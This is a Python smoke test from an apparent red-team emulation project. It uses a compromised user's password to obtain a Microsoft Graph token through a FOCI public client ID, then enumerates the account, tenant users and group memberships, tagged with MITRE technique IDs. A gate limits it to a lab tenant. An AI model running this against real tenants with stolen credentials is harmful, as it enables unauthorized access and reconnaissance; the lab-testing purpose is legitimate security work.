# SPDX-License-Identifier: MIT
"""
Step 4 smoke test: token acquisition as the compromised user, against the
Microsoft Graph Command Line Tools FOCI public client ID.

Calls:
  - /me  (T1078 valid-account confirmation)
  - /users?$select=displayName,mail,userPrincipalName  (T1087 account discovery)
  - /me/memberOf  (T1069 permission groups discovery)

Prereqs:
  pip install msal requests python-dotenv
"""

import os
import sys
import json
import requests
from msal import PublicClientApplication
from dotenv import load_dotenv

load_dotenv()

TENANT_ID    = os.environ["AZURE_TENANT_ID"]
CLIENT_ID    = os.environ["FOCI_CLIENT_ID"]
USERNAME     = os.environ["COMPROMISED_USER_UPN"]
PASSWORD     = os.environ["COMPROMISED_USER_PASSWORD"]

# G-1 (ADR 0008): this Sprint 1 smoke test calls MSAL directly and bypasses the
# consent gate in identity.acquire_token, so it runs only against the lab tenant
# (REJEWSKI_LAB_TENANT_ID).
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from roe_gate import require_lab_tenant  # noqa: E402
require_lab_tenant(TENANT_ID, "step4-token-smoke.py")

AUTHORITY = f"https://login.microsoftonline.com/{TENANT_ID}"
SCOPES    = ["https://graph.microsoft.com/.default"]

app = PublicClientApplication(client_id=CLIENT_ID, authority=AUTHORITY)

result = app.acquire_token_by_username_password(
    username=USERNAME,
    password=PASSWORD,
    scopes=SCOPES,
)

if "access_token" not in result:
    print("Token acquisition FAILED")
    print(json.dumps(result, indent=2))
    sys.exit(1)

token = result["access_token"]
headers = {"Authorization": f"Bearer {token}"}

print("=== /me ===")
me = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers).json()
print(json.dumps(me, indent=2))

print("\n=== /users (top 25, T1087 Account Discovery) ===")
users = requests.get(
    "https://graph.microsoft.com/v1.0/users",
    headers=headers,
    params={"$select": "displayName,mail,userPrincipalName,department", "$top": 25},
).json()
print(json.dumps(users, indent=2))

print("\n=== /me/memberOf (T1069 Permission Groups Discovery) ===")
groups = requests.get("https://graph.microsoft.com/v1.0/me/memberOf", headers=headers).json()
print(json.dumps(groups, indent=2))

print("\nSmoke test complete. Token acquired as", USERNAME)